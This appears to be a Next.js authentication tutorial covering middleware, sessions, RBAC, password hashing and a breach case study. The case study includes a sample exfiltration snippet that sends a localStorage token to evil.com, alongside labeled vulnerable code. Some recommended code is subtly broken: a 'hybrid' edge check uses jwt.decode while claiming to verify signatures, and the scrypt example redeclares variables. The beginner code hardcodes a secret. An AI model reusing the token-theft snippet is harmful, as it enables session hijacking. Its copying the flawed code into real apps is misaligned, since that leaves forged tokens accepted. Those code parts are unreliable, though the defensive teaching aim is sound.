**Edge Middleware vs. API Route Middleware:**

Next.js 12+ introduced Edge Middleware that runs on Vercel's Edge Network before requests reach your server. This middleware uses the Web Request/Response API (not Node.js), executes in a V8 isolate (not Node.js), and has a 30-second timeout.

Edge Middleware is perfect for redirects, header manipulation, and geo-blocking because it runs globally close to users (sub-50ms). However, you cannot use Node.js modules like `bcrypt` or connect to databases directly. For complex auth logic requiring database lookups, use API route middleware instead.

**Session-Based Authentication Architecture:**

Session-based auth stores user data server-side and sends only a session ID to the client. When a user logs in, you create a session object `{ userId, email, role }`, store it in Redis/database with a unique ID, and set a cookie containing that ID. On subsequent requests, you read the session ID from the cookie, look up the session data, and attach it to the request.

This approach allows immediate revocation: delete the session from Redis, and the user is logged out globally. However, it requires a shared session store (Redis) for multi-server deployments and adds database latency to every request.

**Role-Based Access Control (RBAC) Implementation:**

RBAC extends authentication with authorization. After verifying who the user is (authentication), check what they can do (authorization). Implementing RBAC in middleware creates a reusable pattern:

```typescript
function withRole(requiredRole: string) {
  return (handler: NextApiHandler) => {
    return withAuth(async (req: AuthenticatedRequest, res: NextApiResponse) => {
      const user = await db.user.findUnique({ where: { id: req.user!.id } });

      if (!user || user.role !== requiredRole) {
        return res.status(403).json({ error: 'Insufficient permissions' });
      }

      return handler(req, res);
    });
  };
}
```

This pattern composes: `withRole('admin')` wraps `withAuth`, which wraps your handler. For more complex scenarios, use permission-based access control where users have multiple permissions rather than a single role.

**OAuth 2.0 and NextAuth.js:**

OAuth is an authorization protocol that delegates authentication to third-party providers (Google, GitHub). The flow involves: redirect to provider → user logs in → provider redirects back with code → exchange code for token → use token to fetch user data.

NextAuth.js abstracts this complexity, handling the OAuth dance, session management, and database integration. It supports both JWT and database sessions, provides built-in CSRF protection, and integrates seamlessly with Prisma. For production applications requiring social login, NextAuth.js is the recommended solution.

**Security Best Practices:**

Always hash passwords with bcrypt (or Argon2) using a cost factor of 10+. Use HTTPS in production to prevent token interception. Implement CSRF protection for state-changing operations. Set appropriate CORS headers to prevent unauthorized cross-origin requests. Use rate limiting to prevent brute-force attacks. Never expose JWT secrets in client code or version control.

---

## 🐛 Real-World Scenario: Authentication Vulnerability Exploited

**Production Context:**
An e-commerce platform with 250,000 users discovered a critical security breach. Attackers gained admin access to 1,200 user accounts over 72 hours, modifying orders, accessing payment information, and creating fraudulent admin accounts. The breach was discovered when legitimate users reported unauthorized purchases.

**Initial Impact Metrics:**
- Compromised accounts: 1,200 (0.48% of user base)
- Fraudulent transactions: $47,800
- Data exposed: Email addresses, order history, shipping addresses
- Reputation damage: 4,200 user account deletions
- Customer support tickets: 15,600 in 48 hours
- Regulatory investigation: GDPR violation pending

**Vulnerability Discovery:**

**Issue 1: JWT stored in localStorage (XSS attack vector)**
```typescript
// ❌ VULNERABLE CODE
// pages/api/auth/login.ts
export default async function handler(req, res) {
  const { email, password } = req.body;
  const user = await validateUser(email, password);

  if (user) {
    const token = jwt.sign({ id: user.id, email, role: user.role }, SECRET);

    // PROBLEM: Token sent in JSON, client stores in localStorage
    return res.json({ token, user });
  }

  res.status(401).json({ error: 'Invalid credentials' });
}

// Client code
const { token } = await fetch('/api/auth/login').then(r => r.json());
localStorage.setItem('token', token); // ❌ Accessible to XSS!
```

**Attack Vector:**
A third-party analytics script had been compromised (supply chain attack). The malicious code read tokens from localStorage and sent them to an attacker-controlled server:

```javascript
// Injected malicious code in analytics library
const token = localStorage.getItem('token');
if (token) {
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token, domain: window.location.host })
  });
}
```

**Issue 2: No token expiration validation**
```typescript
// ❌ VULNERABLE CODE
export function withAuth(handler: NextApiHandler) {
  return async (req: AuthenticatedRequest, res: NextApiResponse) => {
    const token = req.headers.authorization?.replace('Bearer ', '');

    if (!token) {
      return res.status(401).json({ error: 'No token' });
    }

    try {
      // PROBLEM: verify() accepts any valid signature, even expired tokens
      const decoded = jwt.verify(token, SECRET, { ignoreExpiration: true });
      req.user = decoded;
      return handler(req, res);
    } catch (error) {
      return res.status(401).json({ error: 'Invalid token' });
    }
  };
}
```

**Issue 3: Weak JWT secret**
```typescript
// ❌ VULNERABLE CODE in .env.local
JWT_SECRET=secret123
// Weak secret = easy to brute-force
```

**Issue 4: Role injection via JWT payload manipulation**
```typescript
// ❌ VULNERABLE CODE
const token = jwt.sign({ id: user.id, email, role: user.role }, SECRET);

// Attacker modified the role in token payload by finding a collision
// (weak secret allowed brute-force)
// Changed { role: 'user' } to { role: 'admin' }
```

**Solution Implementation:**

**Fix 1: Move tokens to httpOnly cookies**
```typescript
// ✅ SECURE CODE
// pages/api/auth/login.ts
import cookie from 'cookie';

export default async function handler(req, res) {
  const { email, password } = req.body;
  const user = await validateUser(email, password);

  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Short-lived access token (15min)
  const accessToken = jwt.sign(
    { id: user.id, email: user.email }, // Don't include role
    process.env.JWT_SECRET!,
    { expiresIn: '15m' }
  );

  // Long-lived refresh token (7 days)
  const refreshToken = jwt.sign(
    { id: user.id, type: 'refresh' },
    process.env.REFRESH_SECRET!,
    { expiresIn: '7d' }
  );

  // Store refresh token in database for revocation capability
  await db.session.create({
    data: {
      userId: user.id,
      refreshToken,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
    }
  });

  // Set httpOnly cookies (JavaScript cannot access)
  res.setHeader('Set-Cookie', [
    cookie.serialize('accessToken', accessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 15 * 60,
      path: '/'
    }),
    cookie.serialize('refreshToken', refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60,
      path: '/'
    })
  ]);

  res.status(200).json({ user: { id: user.id, email: user.email } });
  // Never send tokens in response body!
}
```

**Fix 2: Enforce token expiration and fetch role from database**
```typescript
// ✅ SECURE CODE
import cookie from 'cookie';

export function withAuth(handler: NextApiHandler) {
  return async (req: AuthenticatedRequest, res: NextApiResponse) => {
    const cookies = cookie.parse(req.headers.cookie || '');
    const token = cookies.accessToken;

    if (!token) {
      return res.status(401).json({ error: 'Not authenticated' });
    }

    try {
      // Verify with expiration enforcement
      const decoded = jwt.verify(token, process.env.JWT_SECRET!) as any;

      // CRITICAL: Fetch role from database (single source of truth)
      const user = await db.user.findUnique({
        where: { id: decoded.id },
        select: { id: true, email: true, role: true }
      });

      if (!user) {
        return res.status(401).json({ error: 'User not found' });
      }

      req.user = user;
      return handler(req, res);
    } catch (error) {
      if (error instanceof jwt.TokenExpiredError) {
        return res.status(401).json({ error: 'Token expired', code: 'TOKEN_EXPIRED' });
      }
      return res.status(401).json({ error: 'Invalid token' });
    }
  };
}
```

**Fix 3: Use strong JWT secret**
```typescript
// ✅ SECURE CODE - Generate with: openssl rand -base64 64
JWT_SECRET=XnZr8u/A+QeThWmYq3t6w9z$C&F)J@McRfUjXn2r5u8x/A?D(G+KbPeSgVkYp3s6
REFRESH_SECRET=ZnFkJ3s6v9y$B&E)H@McQfTjWnZr4u7x!A%D*G-KaPdRgUkXp2s5v8y/B?E(H+M
```

**Fix 4: Implement token refresh**
```typescript
// ✅ SECURE CODE
// pages/api/auth/refresh.ts
export default async function handler(req, res) {
  const cookies = cookie.parse(req.headers.cookie || '');
  const refreshToken = cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }

  try {
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET!) as any;

    // Verify refresh token exists in database and hasn't been revoked
    const session = await db.session.findFirst({
      where: {
        refreshToken,
        userId: decoded.id,
        expiresAt: { gt: new Date() }
      }
    });

    if (!session) {
      return res.status(401).json({ error: 'Invalid refresh token' });
    }

    // Issue new access token
    const newAccessToken = jwt.sign(
      { id: decoded.id },
      process.env.JWT_SECRET!,
      { expiresIn: '15m' }
    );

    res.setHeader('Set-Cookie', cookie.serialize('accessToken', newAccessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 15 * 60,
      path: '/'
    }));

    res.status(200).json({ success: true });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
}
```

**Fix 5: Add logout endpoint that revokes refresh token**
```typescript
// ✅ SECURE CODE
// pages/api/auth/logout.ts
export default withAuth(async (req: AuthenticatedRequest, res: NextApiResponse) => {
  const cookies = cookie.parse(req.headers.cookie || '');
  const refreshToken = cookies.refreshToken;

  if (refreshToken) {
    // Delete refresh token from database
    await db.session.deleteMany({
      where: { refreshToken }
    });
  }

  // Clear cookies
  res.setHeader('Set-Cookie', [
    cookie.serialize('accessToken', '', {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 0,
      path: '/'
    }),
    cookie.serialize('refreshToken', '', {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 0,
      path: '/'
    })
  ]);

  res.status(200).json({ message: 'Logged out successfully' });
});
```

**Post-Fix Security Audit Metrics:**
- XSS attack vector: Eliminated (tokens not in localStorage)
- Token theft attempts: 0 successful (httpOnly cookies protected)
- Unauthorized admin access: 0 incidents
- Token expiration enforcement: 100% compliance
- Role injection attempts: Blocked (roles fetched from DB)
- GDPR compliance: Restored
- Security score (Mozilla Observatory): F → A+

**Cost Impact:**
- Fraud losses prevented: Estimated $120,000/month
- Customer trust restored: 87% of churned users returned
- Insurance premium reduction: 15%
- Security audit costs: $25,000 (one-time)

**Key Lessons:**
1. NEVER store auth tokens in localStorage (use httpOnly cookies)
2. Always enforce token expiration (don't ignore expiry)
3. Use cryptographically strong secrets (min 256 bits)
4. Fetch sensitive data (roles, permissions) from database, not tokens
5. Implement token refresh for better UX without sacrificing security
6. Monitor third-party dependencies for supply chain attacks
7. Use Content Security Policy (CSP) headers to mitigate XSS
8. Implement token revocation capability for emergency response

---

## ⚖️ Trade-offs: Authentication Strategy Decisions

### 1. JWT vs. Sessions vs. OAuth - Comprehensive Comparison

**Scenario: SaaS Application (10,000 users)**

**JWT Tokens:**

**Performance:**
- Auth check latency: ~1ms (no DB lookup)
- Storage: 0 server-side, ~400 bytes client cookie
- Scalability: Horizontal (stateless)
- Cold start penalty: None

**Security:**
- Token revocation: Hard (need blacklist)
- Immediate logout: Impossible (wait for expiry)
- XSS vulnerability: High if in localStorage
- CSRF: Low if using cookies properly

**Developer Experience:**
- Setup complexity: Low
- Debugging: Easy (decode JWT)
- Multi-service auth: Excellent
- Mobile app support: Excellent

**Cost:**
- Server resources: Minimal
- Database queries: 0 per request (role in token) or 1 (role from DB)
- Monthly cost (10k users): ~$5 (minimal compute)

**Best For:**
- Microservices architecture
- Mobile apps
- Serverless platforms (Vercel, Lambda)
- High-scale applications (100k+ users)

**Avoid When:**
- Need immediate user blocking
- Regulatory compliance requires session tracking
- Paranoid security requirements

---

**Session-Based:**

**Performance:**
- Auth check latency: ~15ms (Redis lookup) or ~50ms (DB lookup)
- Storage: Session ID (~50 bytes) client + session data server
- Scalability: Vertical (shared state) or Redis cluster
- Cold start penalty: Redis connection (~20ms)

**Security:**
- Token revocation: Immediate (delete session)
- Immediate logout: Yes
- XSS vulnerability: Low (minimal data in cookie)
- CSRF: High (need CSRF tokens)

**Developer Experience:**
- Setup complexity: Medium (need Redis/session store)
- Debugging: Harder (inspect session store)
- Multi-service auth: Complex (shared session store)
- Mobile app support: Good (need session cookie handling)

**Cost:**
- Server resources: Higher (Redis)
- Database queries: 1-2 per request
- Monthly cost (10k users): ~$50 (Redis + server)

**Best For:**
- Monolithic applications
- Admin dashboards requiring instant revocation
- Traditional web apps
- When security > performance

**Avoid When:**
- Serverless architecture
- Microservices with independent deploys
- Mobile-first applications

---

**OAuth 2.0 + NextAuth.js:**

**Performance:**
- Auth check latency: Varies (JWT ~1ms, DB session ~15ms)
- Storage: Configurable (JWT or session)
- Scalability: Depends on strategy
- Cold start penalty: NextAuth initialization (~50ms)

**Security:**
- Token revocation: Depends on strategy
- Immediate logout: Depends on strategy
- XSS vulnerability: Low (handles cookies)
- CSRF: Protected (built-in)

**Developer Experience:**
- Setup complexity: Medium-High
- Debugging: Good (NextAuth debug mode)
- Multi-service auth: Excellent (OAuth providers)
- Mobile app support: Excellent (OAuth standard)

**Cost:**
- Server resources: Medium
- Database queries: 1-3 per request (depends on adapter)
- Monthly cost (10k users): ~$30-70

**Best For:**
- Applications needing social login
- Enterprise SSO (SAML, OAuth)
- Multi-tenant SaaS
- When development speed matters

**Avoid When:**
- Simple authentication needs
- Want minimal dependencies
- Need full control over auth flow

---

### 2. Middleware Patterns: Higher-Order Functions vs. Edge Middleware

**Higher-Order Function Middleware (API Routes):**

**Example:**
```typescript
export default withAuth(withLogging(withRateLimit(handler)));
```

**Pros:**
- Full Node.js access (bcrypt, database, file system)
- Easy to compose and test
- Type-safe with TypeScript
- Works in any deployment environment
- Can access request body

**Cons:**
- Runs after routing (can't redirect early)
- Not globally enforced (must remember to apply)
- Doesn't protect Server Components
- Runs per-request (no early termination)

**Performance:**
- Execution time: ~5-20ms (depends on middleware)
- Location: Regional (where function deployed)
- Cold start: 100-500ms

**Best For:**
- API route authentication
- Complex business logic (rate limiting with DB)
- Database-dependent operations
- Legacy Next.js (< 12)

---

**Edge Middleware (Global, runs on Vercel Edge):**

**Example:**
```typescript
// middleware.ts
export function middleware(request: NextRequest) {
  const token = request.cookies.get('token');
  if (!token && request.nextUrl.pathname.startsWith('/dashboard')) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
}
```

**Pros:**
- Runs globally (< 50ms latency worldwide)
- Executes before routing (early termination)
- Protects pages + API routes + Server Components
- Minimal cold start (~0-10ms)
- Can modify headers, cookies, responses

**Cons:**
- No Node.js modules (no bcrypt, no database drivers)
- 1MB bundle size limit
- Limited execution time (30s max)
- Cannot access request body (streaming only)
- Harder to debug

**Performance:**
- Execution time: ~1-5ms
- Location: Global edge network
- Cold start: ~0-10ms

**Best For:**
- Redirects (auth, geo-blocking, A/B testing)
- Header manipulation (CORS, CSP)
- Bot detection
- Simple token checks (JWT decode, not verify)

---

**Decision Matrix:**

| Requirement | HOF Middleware | Edge Middleware |
|-------------|----------------|-----------------|
| Database lookup | ✅ Yes | ❌ No |
| Password hashing | ✅ Yes | ❌ No |
| Global enforcement | ⚠️ Manual | ✅ Automatic |
| Latency | ~20ms | ~2ms |
| Protect pages | ❌ No | ✅ Yes |
| Complex auth | ✅ Yes | ⚠️ Limited |
| Rate limiting (DB) | ✅ Yes | ❌ No |
| Redirects | ⚠️ Slower | ✅ Fast |

**Hybrid Approach (Recommended):**
```typescript
// middleware.ts - Edge (fast checks)
export function middleware(request: NextRequest) {
  const token = request.cookies.get('token');

  // Quick check: does token exist?
  if (!token && request.nextUrl.pathname.startsWith('/dashboard')) {
    return NextResponse.redirect(new URL('/login', request.url));
  }

  // Optional: decode JWT (verify signature, not against DB)
  try {
    const decoded = jwt.decode(token);
    if (!decoded || decoded.exp < Date.now() / 1000) {
      return NextResponse.redirect(new URL('/login', request.url));
    }
  } catch {
    return NextResponse.redirect(new URL('/login', request.url));
  }
}

// API routes - HOF middleware (detailed checks)
export default withAuth(async (req, res) => {
  // Detailed DB check: user exists? role valid?
  const user = await db.user.findUnique({ where: { id: req.user.id } });
  if (!user || user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  // Handle request...
});
```

---

### 3. Password Hashing: bcrypt vs. Argon2 vs. scrypt

**bcrypt (Most Common):**

**Performance:**
- Hash time: ~70ms (cost 10), ~140ms (cost 11)
- Verification time: ~70ms
- Memory usage: Low (~4KB)
- Parallelization: Moderate

**Security:**
- Resistance to GPU attacks: Good
- Resistance to ASIC attacks: Moderate
- Rainbow table protection: Excellent (built-in salt)
- Future-proof: Moderate (hash cost adjustable)

**Developer Experience:**
- Availability: Excellent (npm: bcrypt)
- Compatibility: Universal
- Learning curve: Easy

**Code:**
```typescript
import bcrypt from 'bcrypt';

// Hash password (signup)
const hashedPassword = await bcrypt.hash(password, 10); // cost 10

// Verify password (login)
const valid = await bcrypt.compare(password, hashedPassword);
```

**Best For:**
- Standard web applications
- When compatibility matters
- Teams familiar with bcrypt

---

**Argon2 (Most Secure - WINNER of Password Hashing Competition 2015):**

**Performance:**
- Hash time: ~50-100ms (configurable)
- Verification time: ~50-100ms
- Memory usage: High (configurable, ~64MB default)
- Parallelization: Excellent (multi-threaded)

**Security:**
- Resistance to GPU attacks: Excellent (memory-hard)
- Resistance to ASIC attacks: Excellent
- Rainbow table protection: Excellent (built-in salt)
- Future-proof: Excellent (adjustable time, memory, parallelism)

**Developer Experience:**
- Availability: Good (npm: argon2)
- Compatibility: Requires native bindings (build step)
- Learning curve: Moderate

**Code:**
```typescript
import argon2 from 'argon2';

// Hash password
const hashedPassword = await argon2.hash(password, {
  type: argon2.argon2id, // Hybrid (best)
  memoryCost: 65536, // 64 MB
  timeCost: 3,
  parallelism: 4
});

// Verify password
const valid = await argon2.verify(hashedPassword, password);
```

**Best For:**
- High-security applications (banking, healthcare)
- When you can control server environment (native bindings)
- Future-proofing against hardware advances

---

**scrypt (Node.js Built-in):**

**Performance:**
- Hash time: ~80-120ms (depends on params)
- Verification time: ~80-120ms
- Memory usage: Configurable
- Parallelization: Good

**Security:**
- Resistance to GPU attacks: Excellent (memory-hard)
- Resistance to ASIC attacks: Good
- Rainbow table protection: Excellent (manual salt)
- Future-proof: Good

**Developer Experience:**
- Availability: Excellent (Node.js built-in)
- Compatibility: Universal
- Learning curve: Moderate (manual salt handling)

**Code:**
```typescript
import { scrypt, randomBytes } from 'crypto';
import { promisify } from 'util';

const scryptAsync = promisify(scrypt);

// Hash password
const salt = randomBytes(16).toString('hex');
const hash = await scryptAsync(password, salt, 64);
const hashedPassword = `${salt}:${hash.toString('hex')}`;

// Verify password
const [salt, storedHash] = hashedPassword.split(':');
const hash = await scryptAsync(password, salt, 64);
const valid = storedHash === hash.toString('hex');
```

**Best For:**
- Serverless environments (no native deps)
- When you want built-in Node.js solution
- Good security without external dependencies

---

**Recommendation:**

| Scenario | Best Choice | Reasoning |
|----------|-------------|-----------|
| Standard SaaS | bcrypt (cost 12) | Battle-tested, widely used, good enough |
| High security | Argon2id | Best resistance to modern attacks |
| Serverless/Lambda | scrypt or bcrypt | No native compilation needed |
| Crypto wallet | Argon2id | Maximum security for financial data |
| Legacy migration | bcrypt | Easier migration path |

**Critical Settings:**
- **bcrypt**: Cost factor 12+ (doubles time per increment)
- **Argon2**: memoryCost 65536 (64MB), timeCost 3, parallelism 4
- **scrypt**: N=32768, r=8, p=1, keylen=64

---

## 💬 Explain to Junior: Authentication in Next.js

**Beginner-Friendly Explanation:**

Think of authentication like a nightclub bouncer system. When you want to enter the club (access protected resources), the bouncer checks your ID (authentication) and wristband (authorization).

**Simple Analogy:**

**Step 1: Getting your ID (Login)**
You show your driver's license to the bouncer (send email/password to `/api/auth/login`). The bouncer verifies it's real and not fake (checks password hash), then gives you a special wristband (JWT token or session cookie).

**Step 2: Using your wristband (Authenticated requests)**
Every time you want to enter a VIP area (call protected API routes), you show your wristband. The bouncer checks if it's valid and not expired.

**Step 3: Different wristband colors (Roles)**
Regular club (user role), VIP area (premium role), Staff only (admin role). Your wristband color determines where you can go.

**Basic Authentication Flow:**

```
1. User fills login form → sends to /api/auth/login
2. Server checks email/password in database
3. If valid: create token/session, send to user
4. User stores token (in cookie)
5. User wants to fetch profile → sends token with request
6. Server verifies token is valid and not expired
7. Server responds with protected data
```

**Code Example for Beginners:**

**Login endpoint (giving wristbands):**
```typescript
// pages/api/auth/login.ts
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { email, password } = req.body;

  // Find user in database
  const user = await database.findUser(email);

  if (!user) {
    // Don't reveal if email exists (security)
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Check password (like verifying ID photo matches face)
  const passwordMatch = await bcrypt.compare(password, user.hashedPassword);

  if (!passwordMatch) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Create special wristband (JWT token)
  const token = jwt.sign(
    { id: user.id, email: user.email },
    'super-secret-key', // In real apps, use process.env.JWT_SECRET
    { expiresIn: '7d' } // Wristband expires in 7 days
  );

  // Give wristband to user (send token back)
  res.status(200).json({
    token,
    user: { id: user.id, email: user.email, name: user.name }
  });
}
```

**Protected endpoint (checking wristbands):**
```typescript
// pages/api/profile.ts
import jwt from 'jsonwebtoken';

export default async function handler(req, res) {
  // Get wristband from request
  const token = req.headers.authorization?.replace('Bearer ', '');

  if (!token) {
    return res.status(401).json({ error: 'No wristband! Please login.' });
  }

  try {
    // Verify wristband is real and not expired
    const decoded = jwt.verify(token, 'super-secret-key');

    // Wristband is valid! Fetch user data
    const user = await database.findUser(decoded.id);

    res.status(200).json({ user });
  } catch (error) {
    // Fake or expired wristband
    res.status(401).json({ error: 'Invalid or expired wristband!' });
  }
}
```

**Middleware pattern (reusable bouncer):**
```typescript
// lib/middleware/auth.ts
import jwt from 'jsonwebtoken';

// Reusable bouncer function
export function withAuth(handler) {
  return async (req, res) => {
    const token = req.headers.authorization?.replace('Bearer ', '');

    if (!token) {
      return res.status(401).json({ error: 'Not authenticated' });
    }

    try {
      const decoded = jwt.verify(token, 'super-secret-key');
      req.user = decoded; // Attach user info to request
      return handler(req, res); // Let them in!
    } catch (error) {
      return res.status(401).json({ error: 'Invalid token' });
    }
  };
}

// Use it on any protected route
// pages/api/secret.ts
import { withAuth } from '@/lib/middleware/auth';

async function handler(req, res) {
  // req.user is available here (bouncer already checked)
  res.json({ message: `Hello ${req.user.email}, this is secret data!` });
}

export default withAuth(handler);
```

**Key Concepts Simplified:**

**1. Password Hashing (why we don't store passwords directly):**

Imagine passwords are like house keys. If you store a copy of everyone's key in your drawer (plain text passwords in database), a burglar who breaks in (data breach) can unlock all houses.

Instead, you take a photo of each key and throw away the original (hash the password). When someone shows you a key claiming it's theirs, you take a photo of it and compare to your stored photo. You can verify it matches, but you can't recreate the original key from the photo.

```typescript
// Signup
const hashedPassword = await bcrypt.hash('user-password-123', 10);
// Saves: "$2b$10$XqT..." (hash, not original password)

// Login
const match = await bcrypt.compare('user-entered-password', hashedPassword);
// Compares hashes without storing original
```

**2. JWT Tokens (stateless authentication):**

Think of a JWT like a movie ticket with all your info printed on it: "John Doe, seat A12, expires 8pm". The theater (server) can verify the ticket is authentic by checking the watermark (signature) without calling the box office (database).

**JWT structure:**
```
header.payload.signature
```

- **Header**: Type of ticket (JWT) and how it's signed
- **Payload**: Your information (user ID, email, role)
- **Signature**: Watermark proving it's authentic (can't be faked without secret key)

**3. Sessions (stateful authentication):**

Think of sessions like coat check at a restaurant. When you arrive, they take your coat (user data) and give you a small numbered ticket (session ID). Every time you need something, you show the ticket, they fetch your coat from the rack (lookup session in database).

**Common Beginner Mistakes:**

**Mistake 1: Storing passwords as plain text**
```typescript
// ❌ NEVER DO THIS
const user = await db.create({
  email: 'user@example.com',
  password: 'password123' // ❌ Anyone with DB access can see this!
});

// ✅ ALWAYS hash passwords
const hashedPassword = await bcrypt.hash('password123', 10);
const user = await db.create({
  email: 'user@example.com',
  hashedPassword // ✅ Secure, can't reverse to original
});
```

**Mistake 2: Putting JWT in localStorage (XSS attack risk)**
```typescript
// ❌ BAD: JavaScript can steal this
localStorage.setItem('token', token);
// Malicious script: localStorage.getItem('token') → stolen!

// ✅ GOOD: Use httpOnly cookies (JavaScript can't access)
res.setHeader('Set-Cookie', cookie.serialize('token', token, {
  httpOnly: true, // ✅ JavaScript blocked from reading
  secure: true,
  sameSite: 'strict'
}));
```

**Mistake 3: Not checking token expiration**
```typescript
// ❌ BAD: Accept any token forever
const decoded = jwt.verify(token, SECRET, { ignoreExpiration: true });

// ✅ GOOD: Enforce expiration
const decoded = jwt.verify(token, SECRET); // Throws if expired
```

**Mistake 4: Including sensitive data in JWT payload**
```typescript
// ❌ BAD: JWT payload is PUBLIC (just base64, anyone can decode)
const token = jwt.sign({
  id: user.id,
  email: user.email,
  password: user.password, // ❌ NEVER!
  creditCard: user.creditCard // ❌ NEVER!
}, SECRET);

// ✅ GOOD: Only include non-sensitive identifiers
const token = jwt.sign({
  id: user.id,
  email: user.email
}, SECRET);
```

**Interview Answer Template:**

"Authentication in Next.js API routes is about verifying user identity before granting access to protected resources. The most common approach is JWT-based authentication.

When a user logs in, we verify their email and password against the database. If valid, we generate a JWT token containing the user's ID and email, sign it with a secret key, and send it to the client, typically in an httpOnly cookie for security.

For protected API routes, we use middleware patterns. A higher-order function wraps the route handler, extracts the JWT from the request, verifies its signature and expiration, and attaches the decoded user data to the request object. If verification fails, we return a 401 Unauthorized response.

We always hash passwords using bcrypt before storing them, never store tokens in localStorage to prevent XSS attacks, and use short-lived tokens with refresh token rotation for better security.

For more complex scenarios, libraries like NextAuth.js provide OAuth support, session management, and database adapters out of the box."

**When to Use Different Auth Methods:**
- **JWT**: Mobile apps, microservices, serverless, stateless systems
- **Sessions**: Traditional web apps, need instant token revocation, simpler mental model
- **OAuth**: Need social login (Google, GitHub), enterprise SSO
- **NextAuth.js**: Want all of the above with minimal setup

---
